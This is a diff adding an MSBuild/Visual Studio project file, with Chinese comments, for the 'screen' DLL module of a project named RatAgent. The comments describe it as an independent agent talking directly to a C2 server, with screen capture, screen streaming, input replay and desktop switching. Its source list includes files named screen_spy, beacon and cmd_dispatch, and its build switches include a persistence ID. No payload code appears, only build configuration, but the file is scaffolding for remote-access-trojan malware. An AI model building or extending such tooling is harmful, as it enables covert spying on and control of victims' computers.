@@ -1,0 +1,129 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+  RatAgent.screen.vcxproj — "screen"（远程桌面）模块（DLL 形态）
+
+  本模块 = 抓屏 + 屏幕流 + 输入回放 + 桌面切换，从 client/core 拆出（模块化阶段 2），
+  是**独立 agent、直连 C2**（命令走自己的信道，数据走现有 4445 中继）。
+
+  它由 client/agents/_template/ 那套模板演化而来，改法与模板一致：
+    RatAgentModuleId / RatAgentModuleCaps / TargetName / ProjectGuid。
+-->
+<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|x64">
+      <Configuration>Debug</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|x64">
+      <Configuration>Release</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <VCProjectVersion>17.0</VCProjectVersion>
+    <Keyword>Win32Proj</Keyword>
+    <ProjectGuid>{7E3A1C10-0003-4B2E-9C31-000000000003}</ProjectGuid>
+    <RootNamespace>RatAgentScreen</RootNamespace>
+    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v145</PlatformToolset>
+    <CharacterSet>MultiByte</CharacterSet>
+    <TargetName>RatAgent.screen</TargetName>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v145</PlatformToolset>
+    <CharacterSet>MultiByte</CharacterSet>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <TargetName>RatAgent.screen</TargetName>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <!-- 模块标识（写死成自己的；见 core/module_id.h） -->
+  <PropertyGroup Label="RatAgentSwitches">
+    <RatAgentModuleId>screen</RatAgentModuleId>
+    <RatAgentModuleCaps>(c2::kCapRemote)</RatAgentModuleCaps>
+    <RatAgentDebug Condition="'$(RatAgentDebug)' == ''">1</RatAgentDebug>
+    <RatAgentPersistId Condition="'$(RatAgentPersistId)' == ''">$(RatAgentDebug)</RatAgentPersistId>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>_USRDLL;RAT_AGENT_DLL;RAT_MODULE_ID="$(RatAgentModuleId)";RAT_MODULE_CAPS=$(RatAgentModuleCaps);RAT_AGENT_DEBUG=$(RatAgentDebug);RAT_AGENT_PERSIST_ID=$(RatAgentPersistId);_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <LanguageStandard>stdcpp17</LanguageStandard>
+      <AdditionalOptions>/utf-8 %(AdditionalOptions)</AdditionalOptions>
+      <AdditionalIncludeDirectories>$(ProjectDir)..\..\core;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <Optimization>Disabled</Optimization>
+      <DebugInformationFormat>ProgramDatabase</DebugInformationFormat>
+      <ProgramDataBaseFileName>$(OutDir)RatAgent.screen.pdb</ProgramDataBaseFileName>
+      <TreatWarningAsError>false</TreatWarningAsError>
+    </ClCompile>
+    <Link>
+      <SubSystem>Windows</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <ProgramDatabaseFile>$(OutDir)RatAgent.screen.pdb</ProgramDatabaseFile>
+      <ImportLibrary>$(OutDir)RatAgent.screen.lib</ImportLibrary>
+      <LinkIncremental>false</LinkIncremental>
+      <!-- 屏幕能力需要 WIC（JPEG）与 DXGI（显示信息） -->
+      <AdditionalDependencies>ws2_32.lib;bcrypt.lib;winhttp.lib;windowscodecs.lib;dxgi.lib;%(AdditionalDependencies)</AdditionalDependencies>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>_USRDLL;RAT_AGENT_DLL;RAT_MODULE_ID="$(RatAgentModuleId)";RAT_MODULE_CAPS=$(RatAgentModuleCaps);RAT_AGENT_DEBUG=$(RatAgentDebug);RAT_AGENT_PERSIST_ID=$(RatAgentPersistId);_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <LanguageStandard>stdcpp17</LanguageStandard>
+      <AdditionalOptions>/utf-8 %(AdditionalOptions)</AdditionalOptions>
+      <AdditionalIncludeDirectories>$(ProjectDir)..\..\core;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <ProgramDataBaseFileName>$(OutDir)RatAgent.screen.pdb</ProgramDataBaseFileName>
+    </ClCompile>
+    <Link>
+      <SubSystem>Windows</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <ProgramDatabaseFile>$(OutDir)RatAgent.screen.pdb</ProgramDatabaseFile>
+      <ImportLibrary>$(OutDir)RatAgent.screen.lib</ImportLibrary>
+      <AdditionalDependencies>ws2_32.lib;bcrypt.lib;winhttp.lib;windowscodecs.lib;dxgi.lib;%(AdditionalDependencies)</AdditionalDependencies>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <!-- 本模块自己的源文件（原在 client/core，阶段 2 整体搬来） -->
+    <ClCompile Include="caps.cpp" />
+    <ClCompile Include="screen_module.cpp" />
+    <ClCompile Include="screen_stream.cpp" />
+    <ClCompile Include="screen_spy.cpp" />
+    <ClCompile Include="input_replay.cpp" />
+    <ClCompile Include="desktop_switch.cpp" />
+    <!-- 共享 core -->
+    <ClCompile Include="..\..\core\agent_dll.cpp" />
+    <ClCompile Include="..\..\core\agent_runtime.cpp" />
+    <ClCompile Include="..\..\core\capability.cpp" />
+    <ClCompile Include="..\..\core\protocol.cpp" />
+    <ClCompile Include="..\..\core\crypto.cpp" />
+    <ClCompile Include="..\..\core\net.cpp" />
+    <ClCompile Include="..\..\core\session.cpp" />
+    <ClCompile Include="..\..\core\cmd_dispatch.cpp" />
+    <ClCompile Include="..\..\core\beacon.cpp" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+</Project>
